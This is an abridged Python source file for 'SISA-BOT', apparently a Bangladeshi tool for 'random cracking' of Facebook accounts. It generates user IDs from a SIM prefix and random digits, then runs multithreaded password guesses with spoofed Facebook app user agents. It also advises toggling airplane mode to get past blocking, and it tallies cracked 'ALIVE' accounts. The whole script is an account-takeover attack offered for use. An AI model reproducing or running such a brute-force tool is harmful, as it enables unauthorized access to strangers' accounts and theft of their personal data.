...
try:
    ...
    print('\n\033[1;34mSISA-BOT\033[1;0m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n\033[1;34mSISA-BOT\033[1;0m installing bs4 !...\n')
    time.sleep(0.5)
...
try:
    ...
    if "Bangladesh" not in ___ccc___:
       os.system('xdg-open https://github.com/SiSa-BOT')
...
os.system('xdg-open https://www.facebook.com/sisagaming45')
def logo():
    os.system('clear')
    print(f"""       
{green}┏━━┳┓┏┳━┳━┳━┳━━┓  ┏━━┳━━┳━━┳━━┓
...
{green}┗┛┗┻┛┗┻┻━┻┻━┻━━┛  ┗━━┻━━┻━━┻┛┗┛{cyan} {version}    
{white}{line}
{green}[{white}+{green}] NAME     {cyan}: {green}ROISUL ISLAM SIAM
{green}[{white}+{green}] FACEBOOK {cyan}: {green}SISA AHMED
{green}[{white}+{green}] GIT-HUB  {cyan}: {green}SiSa-BOT
{green}[{white}+{green}] BROTHER  {cyan}: {green}RAHAT CHOWDHURY
{green}[{white}+{green}] WIFE     {cyan}: {green}IREEN AHMED
{white}{line}""")
...
def mahadi():
    os.system('clear')
    logo()
    print(f"{white}[{green}1{white}] {green}START RANDOM CRACKING")
    print(f"{white}[{green}2{white}] {green}OWNER FB ACCOUNT ")
    print(f"{white}[{green}3{white}] {green}REVIEW TOOL OWNER")
    print(f"{white}[{green}4{white}] {green}EXIT ")
    _____mahadi_____ = input(f'{white}[{green}+{white}] {green}SELECT : {white}')
    if _____mahadi_____ in ['A','a','01','1']:
        os.system('xdg-open https://www.facebook.com/sisagaming45')
        ___uids___()
    elif _____mahadi_____ in ['B','b','02','2']:
        os.system('xdg-open https://www.facebook.com/100000233365911')
    elif _____mahadi_____ in ['C','c','03','3']:
        os.system('xdg-open https://m.me/100000233365911')
...
def ___uids___():
 ...
 #   os.system('xdg-open https://www.facebook.com/M4HADI.143')
    ...
    with tred(max_workers=30) as SefatMahadi:
        ...
        logo()
        tl = str(len(user))
        print(f'{green}[{white}+{green}] TOTAL ID {cyan}:  {white}'+tl)
        print(f'{green}[{white}+{green}] SIM CODE {cyan}: {white} {code} ')
        print(f'{green}[{white}+{green}] IF NO RESULT {rad}[{yelloww}ON{white}/{yelloww}OFF{rad}] {green}AIRPLAN MODE')
        print(f'{white}{line}')
        for love in user:
           ids = code+love
           bu = love[:6]
...
def ___random___(ids,passlist):
    try:
        global oks,loop
        sys.stdout.write(f'\r\r{rad}[{green}SISA-💚{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}ALIVE:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
           ...
           # ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2060};'+f'FBLC/it_IT;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            ___MSUA___ = '[FBAN/FB4A;FBAV/377.0.0.31.23;FBBV/613851542;FBDM/density=3.50,width=480,height=2560;FBLC/en_US;FBRV/613851542;FBCR/Smartfren;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A136U;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
